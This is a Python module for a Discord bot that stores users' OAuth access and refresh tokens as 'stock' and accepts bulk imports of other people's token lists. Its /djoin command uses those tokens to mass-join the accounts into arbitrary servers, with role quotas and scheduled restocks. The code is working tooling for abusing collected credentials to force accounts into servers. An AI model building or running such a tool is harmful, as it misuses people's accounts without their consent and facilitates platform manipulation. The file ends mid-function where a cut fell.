"""Discord bot client + slash & prefix command registration."""
from __future__ import annotations

import asyncio
import logging
import secrets
from datetime import datetime, timezone
from typing import Optional

import aiohttp
import discord
from discord import app_commands
from discord.ext import tasks

from ..announcements import db_count, db_init, db_list
from ..config import (
    BOT_TOKEN,
    CLIENT_ID,
    CLIENT_SECRET,
    HARDCODED_OWNERS,
    MAIN_GUILD_ID,
    MAX_ROLES_PER_GUILD,
    PREFIX,
    get_redirect_uri,
)
from ..storage import (
    add_owner_role,
    add_scheduled_restock,
    clear_channel_lock,
    clear_stock,
    delete_user_auth,
    get_channel_lock,
    read_channel_locks,
    read_daily_restock,
    read_scheduled_restocks,
    remove_guild_role_limit,
    remove_owner_role,
    remove_scheduled_restock,
    save_user_auth,
    set_channel_lock,
    set_guild_role_limit,
    write_daily_restock,
    write_scheduled_restocks,
)
from ..tokens import exchange_code, refresh_access_token
from . import embeds as E
from .announcements_view import SubscribeView
from .auth import (
    is_authorized_member,
    is_authorized_user,
    is_hardcoded_owner,
    member_has_owner_role,
)
from .control_panel import (
    control_panel_embed,
    control_panel_view,
    handle_control_panel_button,
)
from .restock import (
    do_check_tokens,
    do_cleanup_servers,
    do_mass_join,
    do_restock,
    get_djoin_limit_for_member,
    send_auth_success_dm,
)

log = logging.getLogger("gecko.bot")

# ─── Client setup ─────────────────────────────────────────────────────────────

intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.messages = True
intents.message_content = True


class GeckoBot(discord.Client):
    def __init__(self) -> None:
        super().__init__(intents=intents)
        self.tree = app_commands.CommandTree(self)
        self._bot_start_time: Optional[datetime] = None
        # guild_id -> first time we saw this guild (for the 14-day auto-leave loop)
        self.server_join_times: dict[int, datetime] = {}
        # type ("stock"|"status") -> {channel_id, message_id} for live-refresh embeds
        self.live_messages: dict[str, dict[str, int]] = {}

    async def setup_hook(self) -> None:
        # Persistent views must be registered before READY so buttons keep working
        # across restarts (subscribe panel + control panel both qualify).
        self.add_view(SubscribeView())
        self.add_view(control_panel_view())


bot = GeckoBot()


def get_client() -> discord.Client:
    return bot


def set_client(_c: discord.Client) -> None:  # kept for API compat
    pass


# ─── Helpers ──────────────────────────────────────────────────────────────────


def _now() -> datetime:
    return datetime.now(timezone.utc)


def _check_channel_lock(guild_id: str, type_: str, channel_id: str) -> Optional[str]:
    locked = get_channel_lock(guild_id, type_)
    if locked and locked != channel_id:
        return locked
    return None


def _parse_duration_to_ms(s: str) -> Optional[int]:
    """Accept '1h', '30m', '2h30m', etc."""
    s = s.strip().lower()
    if not s:
        return None
    total = 0
    num = ""
    for ch in s:
        if ch.isdigit():
            num += ch
        elif ch in ("h", "m", "s") and num:
            n = int(num)
            total += n * (3600 if ch == "h" else 60 if ch == "m" else 1) * 1000
            num = ""
        else:
            return None
    if num:  # bare number → assume minutes
        total += int(num) * 60 * 1000
    return total if total > 0 else None


def _normalize_hhmm(time_str: str) -> Optional[str]:
    parts = time_str.split(":")
    if len(parts) != 2:
        return None
    try:
        h, m = int(parts[0]), int(parts[1])
    except ValueError:
        return None
    if not (0 <= h < 24 and 0 <= m < 60):
        return None
    return f"{h:02d}:{m:02d}"


# ─── Slash command tree ───────────────────────────────────────────────────────

GUILD = discord.Object(id=int(MAIN_GUILD_ID)) if MAIN_GUILD_ID.isdigit() else None


async def _wrong_guild_guard(interaction: discord.Interaction) -> bool:
    if interaction.guild_id is None or str(interaction.guild_id) != MAIN_GUILD_ID:
        await interaction.response.send_message(
            embed=E.wrong_guild_embed(), ephemeral=True
        )
        return False
    return True


async def _owner_guard(interaction: discord.Interaction) -> bool:
    guild = interaction.guild
    if guild is None:
        return False
    if not is_authorized_member(
        str(guild.owner_id), str(guild.id), str(interaction.user.id), interaction.user
    ):
        if interaction.response.is_done():
            await interaction.followup.send(embed=E.deny_embed(), ephemeral=True)
        else:
            await interaction.response.send_message(embed=E.deny_embed(), ephemeral=True)
        return False
    return True


# Decorator helper — applies guild restriction + wrong-guild guard.
def _slash(name: str, description: str):
    def deco(fn):
        cmd = bot.tree.command(name=name, description=description)(fn)
        return cmd

    return deco


# /help
@_slash("help", "Show all bot commands")
async def slash_help(interaction: discord.Interaction):
    if not await _wrong_guild_guard(interaction):
        return
    await interaction.response.send_message(embed=E.help_embed(), ephemeral=True)


# /get_token
@_slash("get_token", "Get your personal OAuth authorization link")
async def slash_get_token(interaction: discord.Interaction):
    if not await _wrong_guild_guard(interaction):
        return
    await interaction.response.send_message(
        embed=E.get_token_embed(str(interaction.user.id)), ephemeral=True
    )


# /auth code
@_slash("auth", "Manually exchange an OAuth code for tokens")
@app_commands.describe(code="The authorization code from the redirect URL")
async def slash_auth(interaction: discord.Interaction, code: str):
    if not await _wrong_guild_guard(interaction):
        return
    locked = _check_channel_lock(
        str(interaction.guild_id), "auth", str(interaction.channel_id)
    )
    if locked:
        await interaction.response.send_message(
            embed=E.channel_locked_embed(locked, "auth"), ephemeral=True
        )
        return
    await interaction.response.defer(ephemeral=True)
    ok, payload = await exchange_code(code.strip(), CLIENT_ID, CLIENT_SECRET, get_redirect_uri())
    if not ok:
        await interaction.followup.send(f"❌ Auth failed: {payload}", ephemeral=True)
        return
    save_user_auth(str(interaction.user.id), payload["access_token"], payload["refresh_token"])
    asyncio.create_task(send_auth_success_dm(bot, str(interaction.user.id)))
    await interaction.followup.send(
        embed=discord.Embed(
            title="✅ Authentication Successful",
            description=f"<@{interaction.user.id}> has been authenticated.",
            color=0x57F287,
            timestamp=_now(),
        ),
        ephemeral=True,
    )


# /count
@_slash("count", "Show stored token count")
async def slash_count(interaction: discord.Interaction):
    if not await _wrong_guild_guard(interaction):
        return
    await interaction.response.send_message(embed=E.count_embed(), ephemeral=True)


# /list_users
@_slash("list_users", "List all authenticated users")
async def slash_list_users(interaction: discord.Interaction):
    if not await _wrong_guild_guard(interaction):
        return
    embed, _ = E.list_users_embed()
    await interaction.response.send_message(embed=embed, ephemeral=True)


# /check_tokens
@_slash("check_tokens", "Validate every stored token")
async def slash_check_tokens(interaction: discord.Interaction):
    if not await _wrong_guild_guard(interaction):
        return
    await interaction.response.defer(ephemeral=True)
    embed = await do_check_tokens()
    await interaction.followup.send(embed=embed, ephemeral=True)


# /stock
@_slash("stock", "Show current token stock")
async def slash_stock(interaction: discord.Interaction):
    if not await _wrong_guild_guard(interaction):
        return
    await interaction.response.send_message(embed=E.stock_embed(), ephemeral=True)


# /status
@_slash("status", "Show bot online status & stats")
async def slash_status(interaction: discord.Interaction):
    if not await _wrong_guild_guard(interaction):
        return
    await interaction.response.send_message(
        embed=E.status_embed(bot, bot._bot_start_time), ephemeral=True
    )


# /servers
@_slash("servers", "List servers the bot is in")
async def slash_servers(interaction: discord.Interaction):
    if not await _wrong_guild_guard(interaction):
        return
    await interaction.response.send_message(
        embed=E.servers_embed(bot, bot.server_join_times), ephemeral=True
    )


# /server_age
@_slash("server_age", "Check how long the bot has been in a server")
@app_commands.describe(server_id="Optional: a specific server ID")
async def slash_server_age(interaction: discord.Interaction, server_id: Optional[str] = None):
    if not await _wrong_guild_guard(interaction):
        return
    await interaction.response.send_message(
        embed=E.server_age_embed(server_id, bot, bot.server_join_times), ephemeral=True
    )


# /invite
@_slash("invite", "Show bot invite link")
async def slash_invite(interaction: discord.Interaction):
    if not await _wrong_guild_guard(interaction):
        return
    await interaction.response.send_message(embed=E.invite_embed(), ephemeral=True)


# /add
@_slash("add", "Show the add-bot embed with buttons")
async def slash_add(interaction: discord.Interaction):
    if not await _wrong_guild_guard(interaction):
        return
    embed, view = E.add_embed(bot)
    await interaction.response.send_message(embed=embed, view=view)


# /owners
@_slash("owners", "List all owners (server, global, role-based)")
async def slash_owners(interaction: discord.Interaction):
    if not await _wrong_guild_guard(interaction):
        return
    await interaction.response.send_message(
        embed=E.owners_embed(str(interaction.guild.owner_id), str(interaction.guild_id)),
        ephemeral=True,
    )


# /listowner_roles
@_slash("listowner_roles", "List all configured owner roles")
async def slash_list_owner_roles(interaction: discord.Interaction):
    if not await _wrong_guild_guard(interaction):
        return
    await interaction.response.send_message(
        embed=E.owner_roles_embed(str(interaction.guild_id)), ephemeral=True
    )


# /setowner_role
@_slash("setowner_role", "Grant owner-level access to everyone with a role")
@app_commands.describe(role="The role to grant owner access to")
async def slash_set_owner_role(interaction: discord.Interaction, role: discord.Role):
    if not await _wrong_guild_guard(interaction):
        return
    # Real server owner OR hardcoded global owner only
    if not (
        str(interaction.user.id) == str(interaction.guild.owner_id)
        or is_hardcoded_owner(str(interaction.user.id))
    ):
        await interaction.response.send_message(
            embed=E.deny_real_owner_embed(), ephemeral=True
        )
        return
    add_owner_role(str(interaction.guild_id), str(role.id))
    await interaction.response.send_message(
        embed=discord.Embed(
            title="✅ Owner Role Added",
            description=f"Members with {role.mention} now have owner-level access.",
            color=0x57F287,
            timestamp=_now(),
        ),
        ephemeral=True,
    )


# /removeowner_role
@_slash("removeowner_role", "Revoke an owner role")
@app_commands.describe(role="The role to revoke owner access from")
async def slash_remove_owner_role(interaction: discord.Interaction, role: discord.Role):
    if not await _wrong_guild_guard(interaction):
        return
    if not (
        str(interaction.user.id) == str(interaction.guild.owner_id)
        or is_hardcoded_owner(str(interaction.user.id))
    ):
        await interaction.response.send_message(
            embed=E.deny_real_owner_embed(), ephemeral=True
        )
        return
    remove_owner_role(str(interaction.guild_id), str(role.id))
    await interaction.response.send_message(
        embed=discord.Embed(
            title="✅ Owner Role Removed",
            description=f"{role.mention} no longer has owner access.",
            color=0xFAA61A,
            timestamp=_now(),
        ),
        ephemeral=True,
    )


# /restart
@_slash("restart", "Restart the bot process (owners only)")
async def slash_restart(interaction: discord.Interaction):
    if not await _wrong_guild_guard(interaction):
        return
    if not await _owner_guard(interaction):
        return
    await interaction.response.send_message("🔄 Restarting…", ephemeral=True)
    log.info("Owner-initiated restart by %s", interaction.user.id)
    # Trigger a clean shutdown — Replit/PM will restart the workflow.
    await bot.close()


# /dashboard
@_slash("dashboard", "Get a private dashboard link (owners only)")
async def slash_dashboard(interaction: discord.Interaction):
    if not await _wrong_guild_guard(interaction):
        return
    if not await _owner_guard(interaction):
        return
    await interaction.response.send_message(embed=E.dashboard_embed(), ephemeral=True)


# /restock
@_slash("restock", "Bulk-import OAuth tokens (owners only)")
@app_commands.describe(
    file="Optional .txt file with one userId,access,refresh per line",
    tokens="Optional pasted text with one token per line",
)
async def slash_restock(
    interaction: discord.Interaction,
    file: Optional[discord.Attachment] = None,
    tokens: Optional[str] = None,
):
    if not await _wrong_guild_guard(interaction):
        return
    if not await _owner_guard(interaction):
        return
    if not file and not tokens:
        await interaction.response.send_message(embed=E.no_tokens_embed(), ephemeral=True)
        return
    await interaction.response.defer(ephemeral=True)
    raw = tokens or ""
    if file:
        try:
            data = await file.read()
            raw = data.decode("utf-8", errors="replace")
        except Exception:
            await interaction.followup.send(
                "❌ Could not read the attachment.", ephemeral=True
            )
            return
    embed = await do_restock(raw)
    await interaction.followup.send(embed=embed, ephemeral=True)


# /add_token
@_slash("add_token", "Authorize a single token line (owners only)")
@app_commands.describe(line="A single line: userId,accessToken,refreshToken")
async def slash_add_token(interaction: discord.Interaction, line: str):
    if not await _wrong_guild_guard(interaction):
        return
    if not await _owner_guard(interaction):
        return
    parts = line.strip().split(",")
    if len(parts) < 3:
        await interaction.response.send_message(
            "❌ Format: `userId,accessToken,refreshToken`", ephemeral=True
        )
        return
    uid, access, refresh = parts[0], parts[1], parts[2]
    new = await refresh_access_token(refresh, CLIENT_ID, CLIENT_SECRET)
    if new is None:
        await interaction.response.send_message(
            "❌ Token rejected by Discord (bad refresh).", ephemeral=True
        )
        return
    save_user_auth(uid, new["access_token"], new["refresh_token"])
    await interaction.response.send_message(
        embed=discord.Embed(
            title="✅ Token Added",
            description=f"<@{uid}> token added to stock.",
            color=0x57F287,
            timestamp=_now(),
        ),
        ephemeral=True,
    )


# /clear_stock
@_slash("clear_stock", "Remove ALL stock tokens (owners only)")
async def slash_clear_stock(interaction: discord.Interaction):
    if not await _wrong_guild_guard(interaction):
        return
    if not await _owner_guard(interaction):
        return
    clear_stock()
    await interaction.response.send_message(
        embed=discord.Embed(
            title="🧹 Stock Cleared",
            description="All bulk-stock tokens have been removed.",
            color=0xFAA61A,
            timestamp=_now(),
        ),
        ephemeral=True,
    )


# /djoin
@_slash("djoin", "Mass-join all authenticated users to a server")
@app_commands.describe(server_id="The target server ID")
async def slash_djoin(interaction: discord.Interaction, server_id: str):
    if not await _wrong_guild_guard(interaction):
        return
    locked = _check_channel_lock(
        str(interaction.guild_id), "djoin", str(interaction.channel_id)
    )
    if locked:
        await interaction.response.send_message(
            embed=E.channel_locked_embed(locked, "djoin"), ephemeral=True
        )
        return
    member = interaction.guild.get_member(interaction.user.id)
    role_limit = get_djoin_limit_for_member(str(interaction.guild_id), member)
    is_owner = is_authorized_member(
        str(interaction.guild.owner_id),
        str(interaction.guild_id),
        str(interaction.user.id),
        member,
    )
    if not is_owner and role_limit is None:
        await interaction.response.send_message(embed=E.deny_embed(), ephemeral=True)
        return
    await interaction.response.defer()
    progress_msg = await interaction.followup.send("⏳ Starting mass join…", wait=True)

    async def on_progress(text: str) -> None:
        try:
            await progress_msg.edit(content=text)
        except Exception:
            pass

    embed = await do_mass_join(server_id, bot, on_progress, limit=role_limit)
    if embed is not None:
        await progress_msg.edit(content="", embed=embed)


# /cleanup_servers
@_slash("cleanup_servers", "Leave every server except the current one (owners only)")
async def slash_cleanup_servers(interaction: discord.Interaction):
    if not await _wrong_guild_guard(interaction):
        return
    if not await _owner_guard(interaction):
        return
    await interaction.response.defer(ephemeral=True)
    embed = await do_cleanup_servers(bot, str(interaction.guild_id))
    await interaction.followup.send(embed=embed, ephemeral=True)


# /control_panel
@_slash("control_panel", "Open the owner control panel (owners only)")
async def slash_control_panel(interaction: discord.Interaction):
    if not await _wrong_guild_guard(interaction):
        return
    if not await _owner_guard(interaction):
        return
    await interaction.response.send_message(
        embed=control_panel_embed(), view=control_panel_view(), ephemeral=True
    )


# ─── Role limits ──────────────────────────────────────────────────────────────


@_slash("setrole", "Set a djoin member-limit for a role")
@app_commands.describe(role="Role to limit", limit="Maximum members this role can djoin")
async def slash_set_role(interaction: discord.Interaction, role: discord.Role, limit: int):
    if not await _wrong_guild_guard(interaction):
        return
    if not await _owner_guard(interaction):
        return
    if limit <= 0:
        await interaction.response.send_message("❌ Limit must be > 0.", ephemeral=True)
        return
    ok, err = set_guild_role_limit(
        str(interaction.guild_id), str(role.id), limit, MAX_ROLES_PER_GUILD
    )
    if not ok:
        await interaction.response.send_message(f"❌ {err}", ephemeral=True)
        return
    await interaction.response.send_message(
        embed=discord.Embed(
            title="✅ Role Limit Set",
            description=f"{role.mention} can now djoin **{limit}** members.",
            color=0x57F287,
            timestamp=_now(),
        ),
        ephemeral=True,
    )


@_slash("removerole", "Remove a role's djoin limit")
@app_commands.describe(role="Role to remove the limit from")
async def slash_remove_role(interaction: discord.Interaction, role: discord.Role):
    if not await _wrong_guild_guard(interaction):
        return
    if not await _owner_guard(interaction):
        return
    removed = remove_guild_role_limit(str(interaction.guild_id), str(role.id))
    msg = "✅ Role limit removed." if removed else "ℹ️ That role had no limit."
    await interaction.response.send_message(msg, ephemeral=True)


@_slash("listroles", "List all role djoin limits in this server")
async def slash_list_roles(interaction: discord.Interaction):
    if not await _wrong_guild_guard(interaction):
        return
    await interaction.response.send_message(
        embed=E.role_limits_embed(str(interaction.guild_id)), ephemeral=True
    )


# ─── Channel locks ────────────────────────────────────────────────────────────


@_slash("setchannel", "Lock a command type to a specific channel (owners only)")
@app_commands.describe(type="Command type to lock", channel="The channel to lock it to")
@app_commands.choices(
    type=[
        app_commands.Choice(name="djoin", value="djoin"),
        app_commands.Choice(name="auth", value="auth"),
    ]
)
async def slash_set_channel(
    interaction: discord.Interaction,
    type: app_commands.Choice[str],
    channel: discord.TextChannel,
):
    if not await _wrong_guild_guard(interaction):
        return
    if not await _owner_guard(interaction):
        return
    set_channel_lock(str(interaction.guild_id), type.value, str(channel.id))
    await interaction.response.send_message(
        embed=discord.Embed(
            title="✅ Channel Locked",
            description=f"`{type.value}` is now locked to {channel.mention}.",
            color=0x57F287,
            timestamp=_now(),
        ),
        ephemeral=True,
    )


@_slash("clearchannel", "Remove a channel lock (owners only)")
@app_commands.describe(type="Command type to unlock")
@app_commands.choices(
    type=[
        app_commands.Choice(name="djoin", value="djoin"),
        app_commands.Choice(name="auth", value="auth"),
    ]
)
async def slash_clear_channel(
    interaction: discord.Interaction, type: app_commands.Choice[str]
):
    if not await _wrong_guild_guard(interaction):
        return
    if not await _owner_guard(interaction):
        return
    cleared = clear_channel_lock(str(interaction.guild_id), type.value)
    msg = "✅ Channel lock cleared." if cleared else "ℹ️ That type was not locked."
    await interaction.response.send_message(msg, ephemeral=True)


@_slash("listchannels", "Show channel locks for this server")
async def slash_list_channels(interaction: discord.Interaction):
    if not await _wrong_guild_guard(interaction):
        return
    await interaction.response.send_message(
        embed=E.channel_locks_embed(str(interaction.guild_id)), ephemeral=True
    )


# ─── Scheduled / daily restocks ───────────────────────────────────────────────


@_slash("schedule_restock", "Schedule a restock to run later (owners only)")
@app_commands.describe(
    time="Time from now (e.g. 1h, 30m, 2h30m)",
    file="Optional .txt file with tokens",
    tokens="Optional pasted token list",
)
async def slash_schedule_restock(
    interaction: discord.Interaction,
    time: str,
    file: Optional[discord.Attachment] = None,
    tokens: Optional[str] = None,
):
    if not await _wrong_guild_guard(interaction):
        return
    if not await _owner_guard(interaction):
        return
    ms = _parse_duration_to_ms(time)
    if ms is None:
        await interaction.response.send_message(
            "❌ Invalid time. Try `1h`, `30m`, `2h30m`.", ephemeral=True
        )
        return
    if not file and not tokens:
        await interaction.response.send_message(embed=E.no_tokens_embed(), ephemeral=True)
        return
    await interaction.response.defer(ephemeral=True)
    raw = tokens or ""
    if file:
        try:
            data = await file.read()
            raw = data.decode("utf-8", errors="replace")
        except Exception:
            await interaction.followup.send("❌ Could not read attachment.", ephemeral=True)
            return
    sid = secrets.token_hex(4)
    run_at = int(_now().timestamp() * 1000) + ms
    add_scheduled_restock(
        {
            "id": sid,
            "runAt": run_at,
            "rawTokens": raw,
            "channelId": str(interaction.channel_id),
            "createdBy": str(interaction.user.id),
        }
    )
    await interaction.followup.send(
        embed=discord.Embed(
            title="✅ Restock Scheduled",
            description=(
                f"Schedule `{sid}` will run in **{time}** "
                f"(<t:{run_at // 1000}:R>) in this channel."
            ),
            color=0x57F287,
            timestamp=_now(),
        ),
        ephemeral=True,
    )


@_slash("list_schedules", "Show pending scheduled restocks (owners only)")
async def slash_list_schedules(interaction: discord.Interaction):
    if not await _wrong_guild_guard(interaction):
        return
    if not await _owner_guard(interaction):
        return
    await interaction.response.send_message(
        embed=E.list_schedules_embed(), ephemeral=True
    )


@_slash("cancel_schedule", "Cancel a scheduled restock (owners only)")
@app_commands.describe(id="The schedule id to cancel")
async def slash_cancel_schedule(interaction: discord.Interaction, id: str):
    if not await _wrong_guild_guard(interaction):
        return
    if not await _owner_guard(interaction):
        return
    removed = remove_scheduled_restock(id)
    msg = (
        f"✅ Schedule `{id}` cancelled."
        if removed
        else f"ℹ️ No pending schedule with id `{id}`."
    )
    await interaction.response.send_message(msg, ephemeral=True)


@_slash("set_daily_restock", "Configure a recurring daily restock (owners only)")
@app_commands.describe(
    time="Time of day in HH:MM (MST, 24h)",
    file="Optional .txt file with tokens",
    tokens="Optional pasted token list",
)
async def slash_set_daily_restock(
    interaction: discord.Interaction,
    time: str,
    file: Optional[discord.Attachment] = None,
    tokens: Optional[str] = None,
):
    if not await _wrong_guild_guard(interaction):
        return
    if not await _owner_guard(interaction):
        return
    norm = _normalize_hhmm(time)
    if norm is None:
        await interaction.response.send_message(
            "❌ Invalid time. Use `HH:MM` (24h, MST).", ephemeral=True
        )
        return
    if not file and not tokens:
        await interaction.response.send_message(embed=E.no_tokens_embed(), ephemeral=True)
        return
    await interaction.response.defer(ephemeral=True)
    raw = tokens or ""
    if file:
        try:
            data = await file.read()
            raw = data.decode("utf-8", errors="replace")
        except Exception:
            await interaction.followup.send("❌ Could not read attachment.", ephemeral=True)
            return
    write_daily_restock(
        {
            "time": norm,
            "rawTokens": raw,
            "channelId": str(interaction.channel_id),
            "createdBy": str(interaction.user.id),
            "lastRanDate": None,
        }
    )
    token_count = sum(1 for ln in raw.splitlines() if ln.strip())
    await interaction.followup.send(
        embed=discord.Embed(
            title="✅ Daily Restock Configured",
            description=f"Will run every day at **{norm} MST** with **{token_count}** tokens.",
            color=0x57F287,
            timestamp=_now(),
        ),
        ephemeral=True,
    )


@_slash("cancel_daily_restock", "Cancel the daily restock (owners only)")
async def slash_cancel_daily_restock(interaction: discord.Interaction):
    if not await _wrong_guild_guard(interaction):
        return
    if not await _owner_guard(interaction):
        return
    write_daily_restock(None)
    await interaction.response.send_message(
        "✅ Daily restock cancelled.", ephemeral=True
    )


@_slash("daily_restock_status", "Show daily restock config (owners only)")
async def slash_daily_restock_status(interaction: discord.Interaction):
    if not await _wrong_guild_guard(interaction):
        return
    if not await _owner_guard(interaction):
        return
    await interaction.response.send_message(
        embed=E.daily_restock_status_embed(), ephemeral=True
    )


# ─── Gecko announcement commands ──────────────────────────────────────────────


@_slash(
    "setup_subscribe",
    "Post the opt-in subscribe embed in this channel (owners only)",
)
async def slash_setup_subscribe(interaction: discord.Interaction):
    if not await _wrong_guild_guard(interaction):
        return
    if not await _owner_guard(interaction):
        return
    embed = E.subscribe_panel_embed(interaction.guild.name)
    await interaction.channel.send(embed=embed, view=SubscribeView())
    await interaction.response.send_message("✅ Subscribe panel posted.", ephemeral=True)


@_slash("announce", "DM all subscribers an announcement (owners only)")
@app_commands.describe(message="The announcement message")
async def slash_announce(interaction: discord.Interaction, message: str):
    if not await _wrong_guild_guard(interaction):
        return
    if not await _owner_guard(interaction):
        return
    await interaction.response.defer(ephemeral=True)
    subscribers = db_list(interaction.guild_id)
    if not subscribers:
        await interaction.followup.send("ℹ️ No subscribers yet.", ephemeral=True)
        return
    embed = E.announcement_dm_embed(interaction.guild.name, message)
    sent = failed = 0
    for uid in subscribers:
        try:
            user = bot.get_user(uid) or await bot.fetch_user(uid)
            await user.send(embed=embed)
            sent += 1
        except Exception:
            failed += 1
        await asyncio.sleep(0.1)  # be polite to the API
    await interaction.followup.send(
        f"✅ Sent to **{sent}** subscriber(s). Failed: **{failed}**.",
        ephemeral=True,
    )


@_slash("subscribers", "Count subscribers in this server")
async def slash_subscribers(interaction: discord.Interaction):
    if not await _wrong_guild_guard(interaction):
        return
    n = db_count(interaction.guild_id) if interaction.guild_id else 0
    await interaction.response.send_message(
        f"📣 **{n}** subscriber(s) in this server.", ephemeral=True
    )


# ─── Live-refresh embed posters ───────────────────────────────────────────────


@_slash("live_stock", "Post a live-updating stock embed (owners only)")
async def slash_live_stock(interaction: discord.Interaction):
    if not await _wrong_guild_guard(interaction):
        return
    if not await _owner_guard(interaction):
        return
    msg = await interaction.channel.send(embed=E.stock_embed())
    bot.live_messages["stock"] = {"channel_id": msg.channel.id, "message_id": msg.id}
    await interaction.response.send_message(
        "✅ Live stock embed posted (refreshes every 30s).", ephemeral=True
    )


@_slash("live_status", "Post a live-updating status embed (owners only)")
async def slash_live_status(interaction: discord.Interaction):
    if not await _wrong_guild_guard(interaction):
        return
    if not await _owner_guard(interaction):
        return
    msg = await interaction.channel.send(embed=E.status_embed(bot, bot._bot_start_time))
    bot.live_messages["status"] = {"channel_id": msg.channel.id, "message_id": msg.id}
    await interaction.response.send_message(
        "✅ Live status embed posted (refreshes every 30s).", ephemeral=True
    )


# ─── Prefix command handler ───────────────────────────────────────────────────


async def handle_prefix(message: discord.Message) -> None:
    """Mirror the most useful slash commands for users who prefer `!cmd`."""
    if message.author.bot or not message.guild or not message.content.startswith(PREFIX):
        return
    if str(message.guild.id) != MAIN_GUILD_ID:
        return  # silently ignore — prefix should not spam wrong-guild embeds

    parts = message.content[len(PREFIX) :].strip().split()
    if not parts:
        return
    cmd = parts[0].lower()
    args = parts[1:]

    guild_owner_id = str(message.guild.owner_id)
    user_id = str(message.author.id)
    is_owner = is_authorized_member(guild_owner_id, str(message.guild.id), user_id, message.author)

    try:
        if cmd == "help":
            await message.reply(embed=E.help_embed())

        elif cmd == "get_token":
            await message.reply(embed=E.get_token_embed(user_id))

        elif cmd == "auth":
            locked = _check_channel_lock(
                str(message.guild.id), "auth", str(message.channel.id)
            )
            if locked:
                await message.reply(embed=E.channel_locked_embed(locked, "auth"))
                return
            if not args:
                await message.reply("Usage: `!auth CODE`")
                return
            ok, payload = await exchange_code(
                args[0].strip(), CLIENT_ID, CLIENT_SECRET, get_redirect_uri()
            )
            if not ok:
                await message.reply(f"❌ Auth failed: {payload}")
                return
            save_user_auth(user_id, payload["access_token"], payload["refresh_token"])
            asyncio.create_task(send_auth_success_dm(bot, user_id))
            await message.reply(
                embed=discord.Embed(
                    title="✅ Authentication Successful",
                    description=f"<@{user_id}> has been authenticated.",
                    color=0x57F287,
                )
            )

        elif cmd == "count":
            await message.reply(embed=E.count_embed())

        elif cmd == "list_users":
            embed, _ = E.list_users_embed()
            await message.reply(embed=embed)

        elif cmd == "check_tokens":
            embed = await do_check_tokens()
            await message.reply(embed=embed)

        elif cmd == "stock":
            await message.reply(embed=E.stock_embed())

        elif cmd == "status":
            await message.reply(embed=E.status_embed(bot, bot._bot_start_time))

        elif cmd == "servers":
            await message.reply(embed=E.servers_embed(bot, bot.server_join_times))

        elif cmd == "server_age":
            sid = args[0] if args else None
            await message.reply(embed=E.server_age_embed(sid, bot, bot.server_join_times))

        elif cmd == "invite":
            await message.reply(embed=E.invite_embed())

        elif cmd == "owners":
            await message.reply(embed=E.owners_embed(guild_owner_id, str(message.guild.id)))

        elif cmd == "listowner_roles":
            await message.reply(embed=E.owner_roles_embed(str(message.guild.id)))

        elif cmd == "listroles":
            await message.reply(embed=E.role_limits_embed(str(message.guild.id)))

        elif cmd == "listchannels":
            await message.reply(embed=E.channel_locks_embed(str(message.guild.id)))

        elif cmd == "subscribers":
            n = db_count(message.guild.id)
            await message.reply(f"📣 **{n}** subscriber(s) in this server.")

        # ── owner-only prefix commands ───────────────────────────────────────
        elif cmd in {
            "restock", "clear_stock", "djoin", "cleanup_servers", "control_panel",
            "setrole", "removerole", "setchannel", "clearchannel",
            "setowner_role", "removeowner_role", "restart", "dashboard",
            "schedule_restock", "list_schedules", "cancel_schedule",
            "set_daily_restock", "cancel_daily_restock", "daily_restock_status",
            "setup_subscribe", "announce",
        }:
            if not is_owner:
                await message.reply(embed=E.deny_embed())
                return

            if cmd == "restock":
                # Accept an attachment OR pasted text after the command.
                raw = " ".join(args).strip()
                if message.attachments:
                    att = message.attachments[0]
                    try:
                        async with aiohttp.ClientSession() as s:
                            async with s.get(att.url) as r:
                                raw = await r.text()
                    except Exception:
                        await message.reply("❌ Could not download the attachment.")
                        return
                if not raw:
                    await message.reply(embed=E.no_tokens_embed())
                    return
                loading = await message.reply("🔄 Restocking…")
                embed = await do_restock(raw)
                await loading.edit(content="", embed=embed)

            elif cmd == "clear_stock":
                clear_stock()
                await message.reply("🧹 Stock cleared.")

            elif cmd == "djoin":
                if not args:
                    await message.reply("Usage: `!djoin SERVER_ID`")
                    return
                locked = _check_channel_lock(
                    str(message.guild.id), "djoin", str(message.channel.id)
                )
                if locked:
                    await message.reply(embed=E.channel_locked_embed(locked, "djoin"))
                    return
                progress = await message.reply("⏳ Starting mass join…")

                async def on_progress(text: str) -> None:
                    try:
                        await progress.edit(content=text)
                    except Exception:
                        pass

                embed = await do_mass_join(args[0], bot, on_progress)
                if embed is not None:
                    await progress.edit(content="", embed=embed)

            elif cmd == "cleanup_servers":
                loading = await message.reply("🧹 Cleaning up…")
                embed = await do_cleanup_servers(bot, str(message.guild.id))
                await loading.edit(content="", embed=embed)

            elif cmd == "control_panel":
                await message.reply(embed=control_panel_embed(), view=control_panel_view())

            elif cmd == "announce":
                msg_text = " ".join(args).strip()
                if not msg_text:
                    await message.reply("Usage: `!announce your message here`")
                    return
                subs = db_list(message.guild.id)
                if not subs:
                    await message.reply("ℹ️ No subscribers yet.")
                    return
                loading = await message.reply(f"📣 Sending to {len(subs)} subscribers…")
                embed = E.announcement_dm_embed(message.guild.name, msg_text)
                sent = failed = 0
                for uid in subs:
                    try:
                        user = bot.get_user(uid) or await bot.fetch_user(uid)
                        await user.send(embed=embed)
                        sent += 1
                    except Exception:
                        failed += 1
                    await asyncio.sleep(0.1)
                await loading.edit(content=f"✅ Sent: {sent} • Failed: {failed}")

            elif cmd == "setup_subscribe":
                await message.channel.send(
                    embed=E.subscribe_panel_embed(message.guild.name),
                    view=SubscribeView(),
                )

            elif cmd == "restart":
                await message.reply("🔄 Restarting…")
                await bot.close()

            elif cmd == "dashboard":
                await message.reply(embed=E.dashboard_embed())

            else:
                await message.reply(
                    f"ℹ️ Use the `/` slash version of `{cmd}` — it has nicer pickers."
                )

        else:
            # Unknown — only respond if the prefix was clearly intended.
            await message.reply("❌ Unknown command. Use `!help` for the full list.")

    except Exception as exc:
        log.exception("Prefix command error")
        try:
            await message.reply(f"❌ Error: {exc}")
        except Exception:
            pass


# ─── Background loops ─────────────────────────────────────────────────────────


@tasks.loop(hours=1)
async def auto_leave_loop():
    now = _now()
    for g in list(bot.guilds):
        if str(g.id) == MAIN_GUILD_ID:
            continue
        joined = bot.server_join_times.get(g.id)
        if not joined:
            continue
        days = (now - joined).days
        if days >= 14:
            log.info("Auto-leaving %s after %d days", g.name, days)
            try:
                await g.leave()
                bot.server_join_times.pop(g.id, None)
            except Exception:
                log.exception("Failed to leave guild %s", g.id)


@tasks.loop(minutes=1)
async def daily_restock_loop():
    daily = read_daily_restock()
    if not daily:
        return
